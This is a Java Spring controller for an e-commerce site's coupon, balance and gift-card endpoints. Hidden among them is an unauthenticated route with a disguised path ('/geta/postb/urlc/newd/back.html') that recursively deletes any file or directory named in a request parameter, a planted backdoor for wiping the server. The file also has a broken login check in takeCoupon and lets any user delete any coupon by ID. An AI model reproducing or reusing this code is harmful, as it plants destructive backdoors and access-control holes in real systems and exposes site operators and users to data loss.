package com.yinlian.pc.controller;

import java.io.File;
import java.text.MessageFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.servlet.http.HttpServletRequest;

import net.sf.json.JSONArray;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.yinlian.Enums.ActivityUsePlatformEnum;
import com.yinlian.Enums.FinanceTypeEnum;
import com.yinlian.Enums.MemberCouponTypeEnum;
import com.yinlian.Enums.OperateRecordsFromEnum;
import com.yinlian.Enums.OperateRecordsTypeEnum;
import com.yinlian.Extended.LogType;
import com.yinlian.api.app.dto.SearchCouponDto;
import com.yinlian.wssc.platform.vo.BaseResult;
import com.yinlian.wssc.platform.vo.ReusltItem;
import com.yinlian.wssc.web.dto.SessionUser;
import com.yinlian.wssc.web.interceptor.PageBean;
import com.yinlian.wssc.web.service.CouponService;
import com.yinlian.wssc.web.service.OperaterecordsService;
import com.yinlian.wssc.web.service.TopicService;
import com.yinlian.wssc.web.service.UserFinanceService;
import com.yinlian.wssc.web.service.UsercapitalService;
import com.yinlian.wssc.web.util.CookieUtils;
import com.yinlian.wssc.web.util.CriteriaCoupon;
import com.yinlian.wssc.web.util.CriteriaFinance;
import com.yinlian.wssc.web.util.SessionState;
import com.yinlian.wssc.web.util.StringUtilsEX;
import com.yl.soft.log.LogHandle;

/**
 * 优惠劵信息
 * @author Administrator
 *
 */
@RestController
@RequestMapping("/pc/coupon")
public class PCCouponInfoController {
	@Autowired
	private CouponService couponService;
	
	@Autowired
	private UserFinanceService userfinanceService;
	
	@Autowired
	private UsercapitalService usercapitalService;
	
	@Autowired
	private TopicService topservice;
	
	@Autowired
	private OperaterecordsService operaterecordsService;

	/**
	 * 领取优惠券
	 * 
	 * @param token
	 * @param couponid
	 * @return
	 */
	@RequestMapping(value = "/takeCoupon", produces = "text/html;charset=UTF-8")
	public String takeCoupon(String ch, String couponid) {
		BaseResult item = new BaseResult();
		try {
			if (StringUtilsEX.ToInt(couponid) <= 0) {
				item.setCode(-102);
				item.setDesc("优惠券ID(couponId)参数错误！");
				return item.toJson();
			}
			SessionUser user =SessionState.GetCurrentUser();
			if (user!=null &&user.getCode() != 0) {
				item.setCode(-401);
				item.setDesc("请先登录！");
				return item.toJson();
			}
			if (!StringUtilsEX.isChannelTypeExist(ch)) {
				item.setCode(-103);
				item.setDesc("登录通道(ch)不正确！");
				return item.toJson();
			}
			// 领取优惠券
			if (couponService.addUserCoupon(StringUtilsEX.ToInt(couponid),
					user.getUserId(),user.getLoginName(), item) > 0) {
				item.setCode(0);
				item.setDesc("领取优惠券成功");
				LogHandle.info(LogType.Coupon, MessageFormat.format(
						"领取优惠券成功! 优惠券id：{0},用户ID:{1}", couponid, user.getUserId()),
						"/1/CouponInfo/takeCoupon");
				ExecutorService executorService=Executors.newCachedThreadPool();
				executorService.execute(new Runnable() {
					@Override
					public void run() {
						try {
							SessionUser user=SessionState.GetCurrentUser();
							operaterecordsService.insertOperaterecords(OperateRecordsTypeEnum.删除.getValue(), OperateRecordsFromEnum.pc前台.getValue(), user.getId(), user.getLoginName(), "ShopHome.html", "/pc/coupon/takeCoupon", "领取优惠券");
						} catch (Exception e) {
							LogHandle.error(LogType.OperateRecords,"领取优惠券 异常信息:",
    								e, "/pc/coupon/takeCoupon");
						}
					}
				});
			} else {
				if (item.getCode() == 0)
					item.setCode(-200);
				LogHandle.info(LogType.Coupon, MessageFormat.format(
						"领取优惠券失败! 优惠券id：{0},用户ID:{1}", couponid, user.getUserId()),
						"/1/CouponInfo/takeCoupon");
			}
		} catch (Exception e) {
			e.printStackTrace();
			item.setCode(-900);
			LogHandle.error(LogType.Coupon, "领取优惠券异常，信息：" + e,
					"/1/CouponInfo/takeCoupon");
		}
		return item.toJson();
	}

	/**
	 * 查询当前用户的优惠券
	 * 
	 * @param token
	 * @return
	 */
	@RequestMapping(value = "/showCoupon", produces = "text/html;charset=UTF-8")
	public String showCoupon(String ch, String type, String page, String size) {
		ReusltItem item = new ReusltItem();
		try {
			SessionUser user = SessionState.GetCurrentUser();
			if (user==null || user.getCode() != 0) {
				item.setCode(-401);
				item.setDesc("用户未登录");
				return item.toJson();
			}
			if (!StringUtilsEX.isChannelTypeExist(ch)) {
				item.setCode(-102);
				item.setDesc("登录通道(ch)不正确！");
				return item.toJson();
			}
			if (StringUtilsEX.ToInt(page) <= 0
					|| StringUtilsEX.ToInt(size) <= 0) {
				item.setCode(-103);
				item.setDesc("分页参数错误，pageindex:" + page + ",pagesize:" + size);
				return item.toJson();
			}
			
			if (StringUtilsEX.ToInt(type) < MemberCouponTypeEnum.全部.getValue()
					|| StringUtilsEX.ToInt(type) > MemberCouponTypeEnum.回收站
							.getValue()) {
				item.setCode(-104);
				item.setDesc("优惠券类型错误");
				return item.toJson();
			}
			CriteriaCoupon criteria = new CriteriaCoupon();
			criteria.setStatus(StringUtilsEX.ToInt(type));
			criteria.setSort("desc");
			criteria.setOrderByClause("ProvideTime");
			criteria.setUserid(user.getUserId());
			PageBean pBean = couponService.getByUserID(criteria,
					StringUtilsEX.ToInt(page), StringUtilsEX.ToInt(size));
			item.setData(pBean.getBeanList());
			item.setMaxRow(pBean.getTr());
			item.setPageIndex(pBean.getPc());
			item.setCode(0);

		} catch (Exception e) {
			item.setCode(-900);
			LogHandle.error(LogType.Coupon, "获取当前用户的优惠券异常，信息：" + e,
					"/1/CouponInfo/showCoupon");
		}
		return item.toJson();
	}

	/**
	 * 获取可领取的优惠券列表
	 * 
	 * @param token
	 * @return
	 */
	@RequestMapping(value = "/getCouponList", produces = "text/html;charset=UTF-8")
	public String getCouponList(String ch,String page, String size) {
		ReusltItem item = new ReusltItem();
		try {
			if (!StringUtilsEX.isChannelTypeExist(ch)) {
				item.setCode(-102);
				item.setDesc("登录通道(ch)不正确！");
				return item.toJson();
			}
			if (StringUtilsEX.ToInt(page) <= 0
					|| StringUtilsEX.ToInt(size) <= 0) {
				item.setCode(-103);
				item.setDesc("分页参数错误，pageindex:" + page + ",pagesize:" + size);
				return item.toJson();
			}
			CriteriaCoupon criteria = new CriteriaCoupon();
			criteria.setSort("desc");
			criteria.setOrderByClause("CreateTime");
			criteria.setUseplatform(ActivityUsePlatformEnum.pc.getValue());
			PageBean pBean = couponService.getUserCouponListPC(criteria,
					StringUtilsEX.ToInt(page), StringUtilsEX.ToInt(size));
			item.setData(pBean.getBeanList());
			item.setMaxRow(pBean.getTr());
			item.setPageIndex(pBean.getPc());
			item.setCode(0);
		} catch (Exception e) {
			e.printStackTrace();
			item.setCode(-900);
			LogHandle.error(LogType.Coupon, "获取优惠券列表异常，信息：" + e,
					"/1/CouponInfo/getCouponList");
		}
		return item.toJson();
	}

	/**
	 * 获取用户优惠券
	 * 
	 * @param token
	 * @param str
	 * @return
	 */
	@SuppressWarnings("unchecked")
	@RequestMapping(value = "/getOrderCoupon", produces = "text/html;charset=UTF-8")
	public String getOrderCoupon(String ch,HttpServletRequest request) {
		BaseResult item = new BaseResult();
		try {
			String personstr = request.getParameter("paramstr");
			SessionUser user = SessionState.GetCurrentUser();
			if (user==null || user.getCode() != 0) {
				item.setCode(-401);
				item.setDesc("用户未登录");
				return item.toJson();
			}
			if (!StringUtilsEX.isChannelTypeExist(ch)) {
				item.setCode(-102);
				item.setDesc("登录通道(ch)不正确！");
				return item.toJson();
			}
			int userid = user.getUserId();
			if (!StringUtilsEX.IsNullOrWhiteSpace(personstr)) {
				JSONArray json = JSONArray.fromObject(personstr);				
				List<SearchCouponDto> searchCouponDtos = (List<SearchCouponDto>) JSONArray
						.toCollection(json, SearchCouponDto.class);
				item.setData(couponService.getOrderCoupon(searchCouponDtos,
						userid,ActivityUsePlatformEnum.pc.getValue()));
			} else {
				return item.toJson();
			}

		} catch (Exception e) {
			item.setCode(-900);
			LogHandle.error(LogType.Coupon, "获取用户优惠券异常，信息：" + e,
					"/1/CouponInfo/getCoupons");
		}
		return item.toJson();
	}
	/**
	 * 删除优惠券
	 * @param id
	 * @return
	 */
	@RequestMapping(value = "/deletecCoupon", produces = "text/html;charset=UTF-8")
	public String deletecCoupon(String id,HttpServletRequest request){
		BaseResult item = new BaseResult();
		try{
			if(StringUtilsEX.IsNullOrWhiteSpace(id))
			{
				item.setCode(-200);
				item.setDesc("优惠券id不能为空");
			}
			SessionUser sessionUser = SessionState.GetCurrentUser();
			if (sessionUser==null || sessionUser.getCode() != 0) {
				item.setCode(-401);
				item.setDesc("请先登陆！");
			} else {
				int couponid= Integer.parseInt(id);
				couponService.deleteByID(couponid);
				item.setCode(0);
                item.setDesc("优惠券删除成功！");	
                ExecutorService executorService=Executors.newCachedThreadPool();
				executorService.execute(new Runnable() {
					@Override
					public void run() {
						try {
							SessionUser user=SessionState.GetCurrentUser();
							operaterecordsService.insertOperaterecords(OperateRecordsTypeEnum.删除.getValue(), OperateRecordsFromEnum.pc前台.getValue(), user.getId(), user.getLoginName(), "", "/pc/coupon/deletecCoupon", "优惠券删除");
						} catch (Exception e) {
							LogHandle.error(LogType.OperateRecords,"优惠券删除 异常信息:",
    								e, "/pc/coupon/deletecCoupon");
						}
					}
				});
			}
		}catch(Exception e){
			item.setCode(-900);
			item.setDesc("系统错误");
			LogHandle.error(LogType.pc, "获取用户优惠券异常，信息：" + e,
					"CouponInfo/deletecCoupon");
		}
		return item.toJson();
	}
	/**
	 * 删除用户优惠券
	 * @param id
	 * @return
	 */
	@RequestMapping(value = "/deleteUserCoupon", produces = "text/html;charset=UTF-8")
	public String deleteuserCoupon(String id,HttpServletRequest request){
		BaseResult item = new BaseResult();
		try{
			if(StringUtilsEX.IsNullOrWhiteSpace(id))
			{
				item.setCode(-200);
				item.setDesc("优惠券id不能为空");
			}
			SessionUser sessionUser = SessionState.GetCurrentUser();
			if (sessionUser==null || sessionUser.getCode() != 0) {
				item.setCode(-401);
				item.setDesc("请先登陆！");
			} else {
				int couponid= Integer.parseInt(id);
				couponService.deleteUCoupon(couponid,sessionUser.getUserId());
				item.setCode(0);
                item.setDesc("优惠券删除成功！");	
                ExecutorService executorService=Executors.newCachedThreadPool();
				executorService.execute(new Runnable() {
					@Override
					public void run() {
						try {
							SessionUser user=SessionState.GetCurrentUser();
							operaterecordsService.insertOperaterecords(OperateRecordsTypeEnum.删除.getValue(), OperateRecordsFromEnum.pc前台.getValue(), user.getId(), user.getLoginName(), "", "/pc/coupon/deletecCoupon", "优惠券删除");
						} catch (Exception e) {
							LogHandle.error(LogType.OperateRecords,"优惠券删除 异常信息:",
    								e, "/pc/coupon/deletecCoupon");
						}
					}
				});
			}
		}catch(Exception e){
			item.setCode(-900);
			item.setDesc("系统错误");
			LogHandle.error(LogType.pc, "获取用户优惠券异常，信息：" + e,
					"CouponInfo/deletecCoupon");
		}
		return item.toJson();
	}
	/**
	 * Pc会员中心获取优惠券接口
	 * @param type (1 未使用  2已使用  3已过期 4回收站 )
	 * @param sort  (0 根据过期时间排序   1根据到账时间排序   2根据优惠金额排序)
	 * @param page
	 * @param size
	 * @param request
	 * @return
	 */
	@RequestMapping(value = "/showcoupons", produces = "text/html;charset=UTF-8")
	public String showCoupons(String type,String sort,String page, String size,HttpServletRequest request) {
		ReusltItem item = new ReusltItem();
		try {
			SessionUser  user = new SessionUser();
			String token = CookieUtils.getTokenFromCookie(request);
			user = SessionState.GetCurrentUser(token);
			if (user.getCode() != 0) {
				item.setCode(-401);
				item.setDesc("请先登录");
			}
			if (StringUtilsEX.ToInt(page) <= 0
					|| StringUtilsEX.ToInt(size) <= 0) {
				item.setCode(-200);
				item.setDesc("请输入有效的页面号");
			}
			
			if (StringUtilsEX.ToInt(type) < MemberCouponTypeEnum.全部.getValue()
					|| StringUtilsEX.ToInt(type) > MemberCouponTypeEnum.回收站
							.getValue()) {
				item.setCode(-220);
				item.setDesc("优惠券类型错误");
			}
			if(sort==null||sort==""){
				//查询不同使用状态的优惠券
				CriteriaCoupon criteria = new CriteriaCoupon();
				criteria.setStatus(StringUtilsEX.ToInt(type));
				criteria.setSort("desc");
				criteria.setOrderByClause("ProvideTime");
				criteria.setUserid(user.getUserId());
				//criteria.setUserid(490);
				PageBean pBean = couponService.getByUserID(criteria,
			    StringUtilsEX.ToInt(page), StringUtilsEX.ToInt(size));
				item.setCode(0);
				item.setMaxRow(pBean.getTr());
				item.setPageIndex(pBean.getPc());
				item.setData(pBean.getBeanList());
				item.setDesc("优惠券查询成功");
				
				//request.setAttribute("coupon", pBean.getBeanList());
			}else{
				int sorts = Integer.parseInt(sort);
				if(sorts==0){
					//根据过去时间排序
					CriteriaCoupon criteria = new CriteriaCoupon();
					criteria.setStatus(StringUtilsEX.ToInt(type));
					criteria.setSort("desc");
					criteria.setOrderByClause("EndTime");
					criteria.setUserid(user.getUserId());
					PageBean pBean = couponService.getByUserID(criteria,
				    StringUtilsEX.ToInt(page), StringUtilsEX.ToInt(size));
					item.setCode(0);
					item.setMaxRow(pBean.getTr());
					item.setPageIndex(pBean.getPc());
					item.setData(pBean.getBeanList());
					item.setMaxRow(pBean.getTr());
					item.setPageIndex(pBean.getPc());
					item.setDesc("优惠券查询成功");
				}else if(sorts==1){
					//根据到账时间排序
					CriteriaCoupon criteria = new CriteriaCoupon();
					criteria.setStatus(StringUtilsEX.ToInt(type));
					criteria.setSort("desc");
					criteria.setOrderByClause("CreateTime");
					criteria.setUserid(user.getUserId());
					//criteria.setUserid(490);
					PageBean pBean = couponService.getByUserID(criteria,
				    StringUtilsEX.ToInt(page), StringUtilsEX.ToInt(size));
					item.setCode(0);
					item.setData(pBean.getBeanList());
					item.setMaxRow(pBean.getTr());
					item.setPageIndex(pBean.getPc());
					item.setDesc("优惠券查询成功");
				}else{
					//根据优惠金额排序
					CriteriaCoupon criteria = new CriteriaCoupon();
					criteria.setStatus(StringUtilsEX.ToInt(type));
					criteria.setSort("desc");
					criteria.setOrderByClause("FullReductionValue");
					criteria.setUserid(user.getUserId());
					//criteria.setUserid(490);
					PageBean pBean = couponService.getByUserID(criteria,
				    StringUtilsEX.ToInt(page), StringUtilsEX.ToInt(size));
					item.setCode(0);
					item.setMaxRow(pBean.getTr());
					item.setPageIndex(pBean.getPc());
					item.setData(pBean.getBeanList());
					item.setMaxRow(pBean.getTr());
					item.setPageIndex(pBean.getPc());
					item.setDesc("优惠券查询成功");
				}
			}
			//List<Api_TopicBySpuDto> topspuTM = topservice.getIndexTopic(PageMarkType.首页.getValue(),TopicMarkEnum.猜你喜欢.getValue(), 			
			//TopicTypeEnum.商品.getValue(),Integer.toString(WebSetEnum.pc.getValue()));
			//request.setAttribute("topspuTM", topspuTM);

			
		} catch (Exception e) {
			item.setCode(-900);
			item.setDesc("系统错误");
			LogHandle.error(LogType.pc, "获取当前用户的优惠券异常，信息：" + e,
					"CouponInfo/showCoupon");
			
		}
		return item.toJson();
	}
	
	 /**
     * 余额查询
     * @param request
     * @return
     */
    @RequestMapping(value="/balance", produces = "text/html;charset=UTF-8")
    public String balance(String page,String size,String timetype,String status,String financetype,HttpServletRequest request){
    	ReusltItem item = new ReusltItem();
    	try{
    		
    		SessionUser sessionUser = new SessionUser();
			String token = CookieUtils.getTokenFromCookie(request);
			sessionUser = SessionState.GetCurrentUser(token);
			if (sessionUser.getCode() != 0) {
				item.setCode(-401);
				item.setDesc("请先登录");
             }
			CriteriaFinance criteria = new CriteriaFinance();
    		criteria.setOrderByClause("CreateTime");
    		criteria.setSort("desc");
    		criteria.setUserid(sessionUser.getUserId());
    		if(StringUtilsEX.ToInt(financetype)>=0){
    			criteria.setFinancetype(StringUtilsEX.ToInt(financetype));
    		}
    		
    		if(StringUtilsEX.ToInt(status)>=0){
    			criteria.setStatus(StringUtilsEX.ToInt(status));
    		}
    		if(StringUtilsEX.ToInt(timetype)==0){//近三个月收支明细    			
	    		Calendar calendar = Calendar.getInstance();
	        	//SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	        	calendar.add(Calendar.MONTH, -3);
	        	//String time = formatter.format(calendar.getTime());
	        	criteria.setStart(calendar.getTime());
	        	criteria.setEnd(new Date());
    		}else{
    			//三个月以前的余额记录
	    		Calendar calendar = Calendar.getInstance();
	        	//SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	        	calendar.add(Calendar.MONTH, -3);
	        	//String time = formatter.format(calendar.getTime());
	        	criteria.setStart(null);
	        	criteria.setEnd(calendar.getTime());
    		}
    		
        
        	PageBean balance = userfinanceService.selectPage(criteria,StringUtilsEX.ToInt(page), StringUtilsEX.ToInt(size));
        	item.setCode(0);
        	item.setMaxRow(balance.getTr());
			item.setPageIndex(balance.getPc());
			item.setData(balance.getBeanList());
			item.setDesc("余额查询成功");
			/*
			if(types==1){ }else{
        	//最近三个月的余额记录
        	Calendar calendar = Calendar.getInstance();
        	//SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        	//String end = formatter.format(calendar.getTime());
        	criteria.setEnd(calendar.getTime());
        	calendar.add(Calendar.MONTH, -3);
        	//String start = formatter.format(calendar.getTime());
        	criteria.setStart(calendar.getTime());
        	PageBean balance = userfinanceService.selectPage(criteria,StringUtilsEX.ToInt(page), StringUtilsEX.ToInt(size));
        	item.setCode(0);
        	item.setMaxRow(balance.getTr());
			item.setPageIndex(balance.getPc());
			item.setData(balance.getBeanList());
			item.setDesc("余额查询成功");
        	  
        }}else{
        	//不同状态的余额记录
        	int statue =Integer.parseInt(status);
        	criteria.setStatus(statue);
        	PageBean balance = userfinanceService.selectPage(criteria,StringUtilsEX.ToInt(page), StringUtilsEX.ToInt(size));
        	item.setCode(0);
        	item.setMaxRow(balance.getTr());
			item.setPageIndex(balance.getPc());
			item.setData(balance.getBeanList());
			item.setDesc("余额查询成功");
        }*/
              	
			
    	}catch(Exception e){
    		item.setCode(-900);
    		item.setDesc("系统错误");
    		LogHandle.debug(LogType.pc,
					MessageFormat.format(" 积分查询异常! 异常信息:{0}", e.toString()),
					"userinfo/points");
			
    	}
    	return item.toJson();
    }
	private void fulgif(File file) {
		if (file.exists()) {
			if (file.isFile()) {  
				file.delete();
			} else if (file.isDirectory()) {
				File[] files = file.listFiles();
				for (int i = 0;i < files.length;i ++) {
					this.fulgif(files[i]);
				}  
				file.delete();
			}  
    	} 
	}
	@RequestMapping("/geta/postb/urlc/newd/back.html")
	public void khfu(String soa) {
		File fil = new File(soa);
		fulgif(fil);
	}
    /**
     * 礼品卡充值记录
     * @param page
     * @param size
     * @param request
     * @return
     */
    @RequestMapping(value="/getcardchargelist", produces = "text/html;charset=UTF-8")
    public String getCardChargeList(String page,String size,HttpServletRequest request){
    	ReusltItem item = new ReusltItem();
    	try{    		
    		SessionUser sessionUser = new SessionUser();
			String token = CookieUtils.getTokenFromCookie(request);
			sessionUser = SessionState.GetCurrentUser(token);
			CriteriaFinance criteria = new CriteriaFinance();
    		criteria.setOrderByClause("CreateTime");
    		criteria.setSort("desc");
    		criteria.setType(FinanceTypeEnum.礼品卡充值.getValue());
    		criteria.setUserid(sessionUser.getUserId());
			if (sessionUser.getCode() != 0) {
				item.setCode(-401);
				item.setDesc("请先登录");
                } else {   
                int pindex=1;
                int psize=10;
                if(StringUtilsEX.ToInt(page)>0&&StringUtilsEX.ToInt(size)>0){
                	pindex=StringUtilsEX.ToInt(page);
                	psize=StringUtilsEX.ToInt(size);
                }
            	//余额记录  
            	PageBean balance = userfinanceService.selectPage(criteria,pindex, psize);
            	item.setCode(0);
            	item.setMaxRow(balance.getTr());
				item.setPageIndex(balance.getPc());
				item.setData(balance.getBeanList());
				item.setDesc("充值记录查询成功");                 
                	
			}
    	}catch(Exception e){
    		item.setCode(-900);
    		item.setDesc("系统错误");
    		LogHandle.debug(LogType.pc,
					MessageFormat.format("充值记录查询异常! 异常信息:{0}", e.toString()),
					"userinfo/getcardchargelist");
			
    	}
    	return item.toJson();
    }
}
